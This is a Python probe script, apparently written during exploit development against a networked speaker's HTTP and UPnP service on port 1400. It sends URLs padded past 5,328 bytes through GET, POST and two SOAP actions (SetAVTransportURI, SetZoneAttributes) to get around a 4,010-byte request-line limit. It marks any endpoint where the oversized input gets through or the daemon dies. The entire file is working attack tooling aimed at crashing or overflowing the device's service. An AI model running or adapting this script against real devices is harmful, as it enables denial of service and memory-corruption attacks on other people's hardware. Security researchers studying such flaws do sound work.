#!/usr/bin/env python3
"""Find an entry that carries a >5328-byte URL past the 4010 request-line gate.

usage: gate_probe.py [device] [--quick]
device defaults to 192.168.4.202 (S1 57.23). Every probe records the status
code and whether /status/zp still answers afterwards.

Probes:
  A  GET  /getaa?u=<N>            (the known path; the gate lives here)
  B  POST /getaa, URL in the body
  C  POST /getaa?u=<N>, body empty
  D  POST /MediaRenderer/AVTransport/Control SetAVTransportURI, URL in the body
  E  POST /DeviceProperties/Control SetZoneAttributes DesiredIcon, URL in the body

A "reach" is any answer other than 408/405 at N > 5328, or a dead daemon.
"""
import sys, subprocess, time

DEV = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith('-') else '192.168.4.202'
QUICK = '--quick' in sys.argv
SIZES = [3900, 4000, 4100, 5000, 5328, 5400, 6000] if QUICK else \
        [3900, 4000, 4010, 4020, 4100, 4500, 5000, 5328, 5400, 6000]
BASE = f'http://{DEV}:1400'


def curl(args, timeout=8):
    p = subprocess.run(['curl', '-s', '-m', str(timeout), '-o', '/dev/null',
                        '-w', '%{http_code}:%{time_total}'] + args, capture_output=True, text=True)
    return p.stdout.strip() if p.returncode == 0 else 'curlrc%d' % p.returncode


def alive():
    return curl([f'{BASE}/status/zp'], 3).split(':')[0]


def probe(tag, n, args):
    pre = alive()
    r = curl(args)
    code, _, t = r.partition(':')
    time.sleep(0.3)
    post = alive()
    reach = code not in ('408', '405', '404') or post != '200'
    print(f'{tag:>3} n={n:<5} code={code:<8} t={t:<8} pre={pre} post={post} '
          f'{"REACH" if reach else "-"}', flush=True)
    return reach


def url(n, scheme='x-file-cifs'):
    return f'{scheme}://192.168.4.160:3012/S/' + 'A' * n + '.jpg'


def soap_seturi(n):
    u = url(n, 'http')
    meta = ('<DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/" '
            'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/">'
            '<item id="-1" parentID="-1" restricted="1"><dc:title>t</dc:title>'
            '<upnp:class>object.item.audioItem.musicTrack</upnp:class>'
            f'<res protocolInfo="http-get:*:audio/mpeg:*">{u}</res></item></DIDL-Lite>')
    meta = meta.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    return ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            '<s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">'
            f'<InstanceID>0</InstanceID><CurrentURI>{u}</CurrentURI>'
            f'<CurrentURIMetaData>{meta}</CurrentURIMetaData>'
            '</u:SetAVTransportURI></s:Body></s:Envelope>')


def soap_icon(n):
    u = url(n, 'http').replace('.jpg', '.png')
    return ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            '<s:Body><u:SetZoneAttributes xmlns:u="urn:schemas-upnp-org:service:DeviceProperties:1">'
            f'<DesiredZoneName>X</DesiredZoneName><DesiredIcon>{u}</DesiredIcon>'
            '<DesiredConfiguration></DesiredConfiguration>'
            '</u:SetZoneAttributes></s:Body></s:Envelope>')


def main():
    print(f'device {DEV}  gate probe  sizes {SIZES[0]}..{SIZES[-1]}')
    for n in SIZES:
        probe('A', n, [f'{BASE}/getaa?u={url(n)}&w=1&h=1'])
    for n in SIZES:
        probe('B', n, ['-X', 'POST', '--data-urlencode', f'u={url(n)}', f'{BASE}/getaa'])
    for n in SIZES:
        probe('C', n, ['-X', 'POST', '--data', 'x=1', f'{BASE}/getaa?u={url(n)}&w=1&h=1'])
    for n in SIZES:
        body = soap_seturi(n)
        probe('D', n, ['-X', 'POST', '-H',
                       'SOAPACTION: "urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"',
                       '-H', 'Content-Type: text/xml', '--data-binary', body,
                       f'{BASE}/MediaRenderer/AVTransport/Control'])
    for n in SIZES:
        body = soap_icon(n)
        probe('E', n, ['-X', 'POST', '-H',
                       'SOAPACTION: "urn:schemas-upnp-org:service:DeviceProperties:1#SetZoneAttributes"',
                       '-H', 'Content-Type: text/xml', '--data-binary', body,
                       f'{BASE}/DeviceProperties/Control'])


if __name__ == '__main__':
    main()
